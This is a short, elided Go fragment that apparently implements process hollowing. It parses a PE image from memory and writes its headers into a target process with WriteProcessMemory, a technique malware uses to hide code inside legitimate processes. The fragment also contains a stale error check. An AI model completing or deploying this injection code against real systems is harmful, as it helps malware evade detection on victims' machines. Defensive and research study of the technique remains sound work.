...
func (h *Hollow) Inject(destPath string) {

	cmd, err := syscall.UTF16PtrFromString(h.Target)
	if err != nil {
		panic(err)
	}
	...
	destPEReader := bytes.NewReader(h.Source)
	if err != nil {
		panic(err)
	}

	f, _ := pe.NewFile(destPEReader)
	...
	err = WriteProcessMemory(hProcess, newImageBase, h.Source, oh.SizeOfHeaders)
	if err != nil {
		panic(err)
	}
